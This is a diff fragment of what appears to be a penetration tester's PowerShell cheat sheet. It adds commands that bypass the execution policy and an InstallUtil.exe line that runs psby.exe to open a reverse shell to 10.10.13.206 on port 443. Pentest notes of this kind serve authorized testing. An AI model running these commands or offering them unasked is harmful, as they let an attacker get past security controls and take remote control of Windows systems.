@@ -7,8 +7,13 @@ Get-Process | ? {$_.ProcessName –eq “explorer”} | select Id,Handles
 
 ### Bypass
 ```
+PowerShell.exe -ExecutionPolicy Bypass -File .\runme.ps1
+PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
+PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
 $ExecutionContext.SessionState.LanguageMode
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /U c:\temp\psby.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
+
 ```
 ### Antivirus
 ```
